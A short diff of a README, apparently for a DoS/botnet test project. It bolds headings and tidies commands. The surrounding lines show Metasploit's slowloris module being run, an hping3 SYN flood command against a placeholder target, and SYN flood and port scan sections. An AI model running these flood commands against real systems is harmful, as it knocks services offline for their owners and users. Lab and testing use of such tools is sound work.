@@ -75,7 +75,7 @@ cd <PATH-FOLDER>
 sudo python3 <FILE-NAME>
 ```
 
-using Same Machine:
+**Using Same Machine:**
 
 ```shell
 cd Test
@@ -84,7 +84,7 @@ py BotNet.py
 
 ### 1. Slowloris
 
-Using Metasploit
+**Using Metasploit**
 
 ```shell
 msfconsole
@@ -116,9 +116,9 @@ rport => <SERVER RUNNING PORT>
 msf6 auxiliary(dos/http/slowloris) > run
 ```
 
-Using hping ( custom packet/attack gegenrator)
+**Using hping ( custom packet/attack generator)**
 
-- `hping3 -S -p 80 --flood 192.168.1.2 <TARGET-IP>` 
+- `hping3 -S -p 80 --flood <TARGET-IP>` 
 
 
 ### 2. Syn Flood
@@ -194,7 +194,7 @@ run
 
 ### TCP / SYN Port Scan
 
-    Using Metasploit
+**Using Metasploit**
 
 ```shell
     msfconsole
